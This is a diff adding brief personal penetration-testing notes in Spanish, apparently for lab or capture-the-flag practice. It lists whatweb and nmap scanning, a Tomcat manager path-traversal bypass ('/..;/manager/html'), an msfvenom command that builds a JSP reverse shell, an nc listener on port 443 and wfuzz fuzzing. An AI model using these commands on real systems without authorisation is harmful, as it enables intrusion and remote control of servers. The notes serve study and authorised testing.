@@ -1,0 +1,17 @@
+whatweb [IP] -> para saber tecnologias de una web
+nmap --script http-enum -p80 -oN webScan -> enumera rutas de la web
+ruta /manager/html para administracion de tomcat
+/..;/manager/html -> vulnerabilidad tomcat de acceso a admin panel
+msfvenom -p java/jsp_shell_reverse_tcp LHOST[mi ip] 
+
+Decompilador Java: jd-gui 
+
+escuchar por un puerto: nc -nlvp 443 (o puerto)
+
+nmap -p- --open -sS --min-rate 5000 -v -n -Pn [IP] -oG allPorts
+
+
+
+wfuzz -c -t 200 -w diccionario ip/fuzz
+
+monkeypentester -> web interesante
